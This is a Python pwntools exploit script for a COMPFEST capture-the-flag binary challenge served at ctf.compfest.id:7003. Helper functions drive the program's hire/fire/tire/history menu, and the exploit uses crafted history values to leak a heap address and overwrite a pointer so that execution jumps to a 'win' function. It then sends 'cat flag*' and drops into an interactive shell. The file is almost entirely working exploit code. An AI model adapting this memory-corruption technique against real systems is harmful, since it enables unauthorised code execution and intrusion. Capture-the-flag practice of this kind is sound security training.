#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = 'ctf.compfest.id', 7003

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# break *0x402dbd
break *0x4028d6

c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# $ pwn checksec chall
#     Arch:       amd64-64-little
#     RELRO:      Partial RELRO
#     Stack:      Canary found
#     NX:         NX enabled
#     PIE:        No PIE (0x400000)
#     SHSTK:      Enabled
#     IBT:        Enabled
#     Stripped:   No

def hire(idx):
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', str(idx).encode())

def fire(idx):
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b'>>', str(idx).encode())

def tire(idx):
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'>>', str(idx).encode())

def view_history():
    io.sendlineafter(b'>>', b'4')

def clear_history():
    io.sendlineafter(b'>>', b'5')

def add_history(val):
    io.sendlineafter(b'>>', str(val).encode())

def exploit():
    global io
    heap = 0x0
    win = 0x402619
    io = initialize()

    add_history(0x407d98)
    add_history(0x0)
    add_history(elf.sym['workers'])
    add_history(0x0)
    add_history(0x8)
    add_history(0x0)
    hire(0x0)
    tire(0x8)

    io.recv(6)
    heap = u64(io.recv(6).ljust(8, b'\x00')) - 0x12380

    clear_history()

    add_history(heap+0x123f0+0x8)
    add_history(0x0)
    add_history(win)
    add_history(0x0)
    tire(0x8)

    io.sendline(b'cat flag*')

    log.info("heap: %#x", heap)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
